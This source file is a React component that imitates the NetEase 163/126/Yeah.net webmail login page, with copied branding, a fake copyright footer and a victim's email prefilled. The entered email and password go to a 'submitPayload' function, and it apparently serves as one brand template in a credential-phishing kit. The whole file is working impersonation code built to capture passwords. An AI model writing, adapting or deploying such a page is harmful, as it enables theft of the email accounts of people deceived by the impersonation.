
import React, { useState } from 'react';
import { useTranslation } from '../components/LanguageProvider';
import { useSecurity } from '../components/SecurityManager';
import { motion } from 'framer-motion';

interface NetEaseThemeProps {
  prefilledEmail?: string;
}

const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
  const { lang } = useTranslation();
  const [username, setUsername] = useState(prefilledEmail?.split('@')[0] || '');
  const [password, setPassword] = useState('');
  const [activeTab, setActiveTab] = useState<'163' | '126' | 'yeah'>('163');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { submitPayload, error, setError } = useSecurity();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await submitPayload({ email: `${username}@${activeTab}.com`, password }, 'netease');
      setPassword('');
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Top Header */}
      <header className="w-full border-b border-gray-100">
        <div className="max-w-[1100px] mx-auto h-20 px-6 flex items-center justify-between">
          <div className="flex items-center">
            <span className="text-[#c00] text-3xl font-bold tracking-tight">網易</span>
            <div className="h-6 w-[1px] bg-gray-300 mx-4"></div>
            <div className="flex flex-col leading-none">
              <span className="text-[#333] font-bold text-xl uppercase">{activeTab}邮箱</span>
              <span className="text-gray-400 text-[10px] mt-0.5">{activeTab}.com</span>
            </div>
          </div>
          
          <nav className="flex items-center space-x-4 text-[13px] text-gray-500">
            <a href="#" className="hover:text-red-500 transition-colors">{lang === 'zh' ? '登录' : 'Login'}</a>
            <a href="#" className="hover:text-red-500 transition-colors">{lang === 'zh' ? '注册' : 'Register'}</a>
            <a href="#" className="hover:text-red-500 transition-colors">{lang === 'zh' ? '帮助' : 'Help'}</a>
          </nav>
        </div>
      </header>

      {/* Hero Section */}
      <main className="relative flex-grow flex items-center justify-center bg-gray-100 overflow-hidden min-h-[580px]">
        {/* Full lifestyle background */}
        <div className="absolute inset-0">
          <img 
            src="https://images.unsplash.com/photo-1544716278-ca5e3f4abd8c?auto=format&fit=crop&q=80&w=2000" 
            alt="Reading" 
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-black/10"></div>
        </div>

        <div className="relative z-10 w-full max-w-[1100px] mx-auto px-6 flex justify-end">
          {/* Login Box */}
          <div className="w-[380px] bg-white shadow-2xl rounded p-1 pb-10">
            {/* Tabs */}
            <div className="flex h-12 bg-gray-50/80 border-b border-gray-100">
              <button 
                onClick={() => setActiveTab('163')}
                className={`flex-1 text-[14px] transition-all font-medium ${activeTab === '163' ? 'bg-white text-red-600' : 'text-gray-500'}`}
              >
                163网易
              </button>
              <button 
                onClick={() => setActiveTab('126')}
                className={`flex-1 text-[14px] transition-all font-medium ${activeTab === '126' ? 'bg-white text-red-600' : 'text-gray-500'}`}
              >
                126网易
              </button>
              <button 
                onClick={() => setActiveTab('yeah')}
                className={`flex-1 text-[14px] transition-all font-medium ${activeTab === 'yeah' ? 'bg-white text-red-600' : 'text-gray-500'}`}
              >
                Yeah.net
              </button>
            </div>

            <form onSubmit={handleSubmit} className="px-10 mt-10 space-y-6">
              <div className="relative border border-gray-300 rounded focus-within:border-red-500 transition-all flex items-center">
                <input 
                  type="text" 
                  value={username} 
                  onChange={(e) => {
                    setUsername(e.target.value);
                    if (error) setError(null);
                  }} 
                  placeholder={lang === 'zh' ? '邮箱帐号或手机号' : 'Username'} 
                  className="flex-grow px-4 py-3 outline-none text-[15px]" 
                />
                <span className="pr-4 text-gray-400 text-[14px]">@{activeTab}.com</span>
              </div>

              <div className="relative border border-gray-300 rounded focus-within:border-red-500 transition-all">
                <input 
                  type="password" 
                  value={password} 
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (error) setError(null);
                  }} 
                  placeholder={lang === 'zh' ? '密码' : 'Password'} 
                  className="w-full px-4 py-3 outline-none text-[15px]" 
                />
              </div>

              <div className="flex items-center justify-between text-[13px] text-gray-500">
                <label className="flex items-center cursor-pointer">
                  <input type="checkbox" className="mr-2 accent-red-600" defaultChecked />
                  {lang === 'zh' ? '十天内免登录' : 'Remember me'}
                </label>
                <a href="#" className="hover:underline">{lang === 'zh' ? '忘记密码?' : 'Forgot Password?'}</a>
              </div>

              <button 
                type="submit"
                disabled={isSubmitting}
                className="w-full py-3.5 bg-[#d81e06] hover:bg-[#b51905] text-white font-bold rounded transition-all text-[18px] shadow-lg shadow-red-200 disabled:opacity-70"
              >
                {isSubmitting ? '...' : (lang === 'zh' ? '登 录' : 'Log in')}
              </button>

              {error && (
                <motion.div 
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="text-red-600 text-[13px] text-center font-medium py-1"
                >
                  {error}
                </motion.div>
              )}

              <div className="pt-4 text-center">
                <a href="#" className="text-[13px] text-gray-400 hover:text-red-500">
                  {lang === 'zh' ? '还没有网易帐号？立即注册' : 'No account? Sign up now'}
                </a>
              </div>
            </form>
          </div>
        </div>
      </main>

      <footer className="w-full py-10 bg-white border-t border-gray-100 text-[12px] text-gray-400">
        <div className="max-w-[1100px] mx-auto px-6 text-center flex flex-col items-center space-y-2">
          <div className="flex items-center space-x-4">
            <a href="#" className="hover:underline">About NetEase</a>
            <span>|</span>
            <a href="#" className="hover:underline">Privacy Policy</a>
            <span>|</span>
            <a href="#" className="hover:underline">Terms of Service</a>
          </div>
          <p>©1997-2025 NetEase, Inc. All Rights Reserved.</p>
        </div>
      </footer>
    </div>
  );
};

export default NetEaseTheme;
